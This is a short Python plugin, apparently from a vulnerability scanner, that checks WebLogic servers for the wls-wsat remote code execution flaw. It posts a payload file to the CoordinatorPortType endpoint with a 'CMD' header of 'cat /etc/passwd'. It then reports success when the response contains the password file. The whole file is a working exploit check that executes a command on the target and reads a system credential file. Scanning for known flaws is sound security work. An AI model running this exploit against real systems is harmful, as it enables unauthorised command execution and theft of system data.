#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):

    url = '{}://{}:{}/wls-wsat/CoordinatorPortType'.format(service, ip, port)
    headers = {
        'SOAPAction': '',
        'CMD': 'cat /etc/passwd',
        'Content-Type': 'text/xml; charset=UTF-8'
    }
    try:
        cwd = os.path.split(__file__)[0]
        with open(os.path.join(cwd, 'weblogic_wls_wsat_rce.dat')) as f:
            data = f.read()

        r = await http_client(ip, port).post(url, data=data, headers=headers, timeout=20)
        if r.status_code == 200 and 'root:x:0' in r.text:
            ret = {
                'alert_group': 'WebLogic wls-wsat RCE',
                'affects': '%s://%s:%s' % (service, ip, port),
                'details': 'WebLogic wls-wsat RCE, content of /etc/passwd: \n {}'.format(r.content[:200])
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == "__main__":
    scan = do_scan('easypen-test.lijiejie.com', 7001, 'http', True, task_msg={})
    run_plugin_test(scan)

